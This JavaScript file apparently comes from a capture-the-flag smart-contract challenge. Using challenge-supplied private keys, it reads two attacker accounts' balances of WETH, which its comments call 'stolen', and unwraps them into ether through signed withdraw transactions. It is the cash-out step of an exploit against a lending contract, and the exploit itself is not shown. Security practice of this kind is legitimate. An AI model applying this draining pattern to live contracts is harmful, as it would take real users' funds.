// import data
const challengeData =			require("./challenge2.json");
const setupABIsetup =			require("./setupABIsetup.json");
const lenderABIweth9 =			require("./lenderABIweth9.json");
const WETH9ABI =			require("./WETH9ABI.json");

const {attackdouble} =			require("./attackdouble.js");

const ENDPOINT =			challengeData["RPC endpoint"];
const SETUPACCT =			challengeData["Setup contract"];
const ATTACKPRIKEY =			challengeData["Private key"];

// setup
const Web3 = require("web3");

// connect
const web3 = new Web3(ENDPOINT);

async function main() {

	try {	

		// get attacker account so I can check my loot
		var ATTACKACCT = await web3.eth.getAccounts();
		ATTACKACCT = ATTACKACCT.toString();
		//
		// get second attack account
		const ATTACKDBL = attackdouble.address;
		const ATTACKDBLPRIKEY = attackdouble.privateKey;

		// init Setup contract
		const Setup = new web3.eth.Contract(setupABIsetup, SETUPACCT);
		
		// get weth address
		const weth = await Setup.methods.weth().call();

		// init Lender contract
		const LenderWeth9 = new web3.eth.Contract(lenderABIweth9, weth);
		
		// init full WETH9 ABI contract object
		const WETH9 = new web3.eth.Contract(WETH9ABI, weth);

		// get total stolen weth balance
		var balance = await LenderWeth9.methods.balanceOf(ATTACKACCT).call();

		// unwrap stolen weth for ether
		var Geteth = await WETH9.methods.withdraw(balance).encodeABI();
    		var GetethTX = {
			to: weth,
       			from: ATTACKACCT,
			gas: 1000000,
        		data: Geteth,
		};
		var signedTX = await web3.eth.accounts.signTransaction(GetethTX, ATTACKPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("Unwrap TX hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});

		// repeat unwrap for attack double account
		balance = await LenderWeth9.methods.balanceOf(ATTACKDBL).call();
		Geteth = await WETH9.methods.withdraw(balance).encodeABI();
    		GetethTX = {
			to: weth,
       			from: ATTACKDBL,
			gas: 1000000,
        		data: Geteth,
		};
		signedTX = await web3.eth.accounts.signTransaction(GetethTX, ATTACKDBLPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("Unwrap TX hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});

	} catch (error) {
		
		// catch any random errors
		console.log("Error: " + error);
	}
}

main();
